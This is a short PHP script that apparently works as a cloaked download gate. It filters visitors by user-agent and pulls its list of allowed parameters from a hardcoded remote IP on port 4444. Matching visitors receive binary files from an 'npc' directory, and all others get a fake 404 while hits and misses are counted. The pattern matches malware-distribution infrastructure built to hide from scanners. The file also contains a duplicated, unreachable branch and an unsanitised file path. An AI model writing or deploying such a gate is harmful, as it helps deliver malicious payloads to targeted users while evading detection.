<?php

$ua = $_SERVER['HTTP_USER_AGENT'];

if ((strpos($ua, 'Mozilla/4.0 (compatible') !== false) ||
    (strpos($ua, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64') !== false) ||
    (strpos($ua, 'Mozilla/5.0 (Windows NT 6.3; Win64; x64') !== false) ||
    $ua == "M") {
  //

  $params = getParams();

  if (in_array($_GET["pub"], $params["params"])) {
    sendFile("./npc/main");
    $count = intval(file_get_contents("+"));
    file_put_contents("+", ++$count);
  } else if (in_array($_GET["pub"], $params["params"])) {
    sendFile("./npc/" . $_GET["pub"]);
    $count = intval(file_get_contents("+"));
    file_put_contents("+", ++$count);
  } else {
    $count = intval(file_get_contents("-"));
    file_put_contents("-", ++$count);
    header("HTTP/1.0 404 Not Found");
    die();
  }
} else {
  $count = intval(file_get_contents("-"));
  file_put_contents("-", ++$count);
  header("HTTP/1.0 404 Not Found");
  die();
}

function sendFile($filename) {
  header("Pragma: public"); 
  header("Expires: 0");
  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
  header("Cache-Control: private", false);
  header("Content-Type: application/octet-stream");
  header("Content-Disposition: attachment; filename=\"" . basename($filename) . "\";" );
  header("Content-Transfer-Encoding: binary");
  header("Content-Length: " . filesize($filename));

  readfile($filename);
}

function getParams() {
  $curl = curl_init();
  curl_setopt_array($curl, array(
    CURLOPT_URL => "http://45.91.200.177:4444/showParams.php",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => array(
      'User-Agent: 1',
    ),
  ));

  $response = curl_exec($curl);
  curl_close($curl);
  return json_decode($response);
}

?>